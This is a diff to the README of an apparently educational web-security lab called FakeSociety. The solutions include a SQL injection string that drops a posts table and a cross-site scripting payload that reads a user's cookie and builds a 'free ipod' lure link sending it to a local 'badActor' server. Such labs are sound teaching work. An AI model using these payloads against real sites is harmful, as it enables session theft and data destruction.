@@ -219,6 +219,8 @@ Unfortunately, I'm not sure I get the joke.  What could it mean?
 
 Note: Your database might become corrupted as you work through this challenge.  If so, simply start fresh by deleting users_posts.db, and running the start script.  When you do figure it out, you'll definitely have to re-create the database.
 
+You might find [this](https://sqlitebrowser.org/) helpful too.  It's a handy GUI for interacting with the database.  You can view the tables and make sample queries with it.
+
 ---
 ###<span style="color: red;">Solution</span> 
 In username:
@@ -229,7 +231,7 @@ username'; DROP TABLE posts;
 
 
 ### Cross-Site Scripting Challenge: Claim Your Free Ipod!!!11
-This one has some extra setup.  You'll be running an additional server on localhost:5000.  From the base directory, and in another terminal (split terminal):
+This one has some extra setup.  You'll be running an additional server on localhost:5000.  cd into badActor, and in another terminal (split terminal):
 1. npm install
 2. node badActorServer.js
 
@@ -243,7 +245,7 @@ Your goal is to get an unsuspecting FakeSociety user to click on a link.  You'll
 
 ---
 ###<span style="color: red;">Solution</span> 
-In username:
+In post:
 ```html
     <script>let baseUrl = 'http://127.0.0.1:5000/'; let decodedCookie = decodeURIComponent(document.cookie); let cookieArr = decodedCookie.split(';')[1]; let finalCookie = cookieArr.split("=")[1]; let complete = `${baseUrl}${finalCookie}`; console.log(complete); document.write(`<h1><a href=${complete}>Click here for a free ipod</a></h1>`)</script>
 
